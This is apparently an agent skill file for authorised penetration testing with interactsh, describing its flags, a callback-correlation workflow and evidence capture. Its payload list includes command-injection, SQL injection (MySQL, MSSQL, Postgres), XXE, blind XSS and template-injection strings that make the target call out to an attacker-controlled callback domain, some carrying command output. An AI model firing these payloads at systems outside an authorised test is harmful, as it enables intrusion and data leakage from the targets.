---
name: interactsh
description: Out-of-band application security testing with interactsh-client - DNS/HTTP callbacks, correlation tokens, and blind vulnerability confirmation
---

# Interactsh OAST Playbook

Official docs:
- https://github.com/projectdiscovery/interactsh

Interactsh is the out-of-band (OAST) collaboration server used to confirm blind vulnerabilities: blind SSRF, blind command injection, blind SQLi, blind XSS, XXE, template injection, and any case where the server fetches a URL or resolves a DNS name you control. `interactsh-client` is pre-installed in the sandbox (`/home/pentester/go/bin/interactsh-client`).

Canonical syntax:
`interactsh-client [flags]`

High-signal flags:
- `-v` verbose mode: print every interaction (DNS, HTTP, SMTP) as it arrives
- `-o <file>` write interactions to a file (persist evidence for reports)
- `-n` disable HTTP server callbacks (DNS-only mode when you only need resolution proof)
- `-s <server>` custom interactsh server (default is the public `oast.fun` cluster)
- `-t <token>` authentication token for the server
- `-p <port>` port for the local callback listener (only needed for server-mode setups)
- `-f` JSON output mode for machine-readable interaction logs

Agent-safe baseline:
`interactsh-client -v -o /workspace/.oast.log`

## Workflow

1. **Start the client** in verbose mode and keep it running (background it or run in a separate exec while you fire requests):
   ```
   interactsh-client -v -o /workspace/.oast.log
   ```
   The client prints a fresh unique domain, e.g. `a1b2c3d4e5f6.oast.fun`, and also a unique token (subdomain prefix) per invocation.
2. **Embed the domain in your payloads** - the goal is a server-initiated DNS or HTTP request to your unique domain:
   - Blind SSRF: `url=https://<unique>.oast.fun/probe`
   - Blind command injection: `; curl http://<unique>.oast.fun/$(whoami)` or `| nslookup <unique>.oast.fun`
   - Blind SQLi: `' AND (SELECT LOAD_FILE(CONCAT('\\\\', '<unique>.oast.fun\\', (SELECT version()))))-- -` (MySQL), `'; EXEC xp_dirtree '\\<unique>.oast.fun\';--` (MSSQL), `COPY x FROM PROGRAM 'curl http://<unique>.oast.fun'` (Postgres)
   - Blind XSS: `<img src=http://<unique>.oast.fun/x>`
   - XXE: `<!DOCTYPE x [<!ENTITY e SYSTEM "http://<unique>.oast.fun/e">]>`
   - Template injection: `{{ ''.__class__.__mro__[1].__subclasses__() }}` plus `curl http://<unique>.oast.fun/ti` in an exec primitive
   - DNS rebinding/SSRF checks: `<unique>.oast.fun` in any host/URL parameter
3. **Correlate** - each invocation gets a unique domain, so an interaction matching that domain proves *that* payload triggered a server-side request. Restart the client (or note the new domain) between payload batches to keep correlation clean.
4. **Capture evidence** - the `-o` file records type (DNS/HTTP), remote IP, full URL/query, and timestamp. Keep it for the report; the source IP should be the target's server, not your machine.

## Usage Rules

- Always use a fresh unique domain per test batch; reusing a domain across payloads makes correlation ambiguous
- Prefer DNS callbacks when HTTP egress is filtered (many WAFs allow DNS); `-n` isolates DNS-only
- Keep payloads small; OAST is for *confirmation*, not data exfiltration - prefer `$(whoami)`/`$(id)` markers over dumping secrets
- Check the source IP of each interaction: it must be the target server, not your own client, to count as a finding
- If no callback arrives, verify the server can reach the internet at all before concluding "not vulnerable"

Failure recovery:
- No interactions at all: test your own reachability (`curl http://<unique>.oast.fun` from the sandbox), then test alternate vectors (DNS vs HTTP, different payload syntax)
- Interactions arrive but from the wrong source IP: client-side fetch (browser, test machine) - not a server-side finding
- Delayed callbacks: wait 10-30s; retry with a fresh domain if none arrive

If uncertain, query web_search with:
`interactsh-client documentation flags out of band`

## Pairing

- Blind SSRF/command injection -> `ssrf`, `command_injection`
- Blind SQLi/XXE -> `sql_injection`, `xxe`
- Blind XSS -> `xss`
- CI/CD import SSRF -> `ci_cd`
- Payment/webhook callbacks -> `payment_gateways`
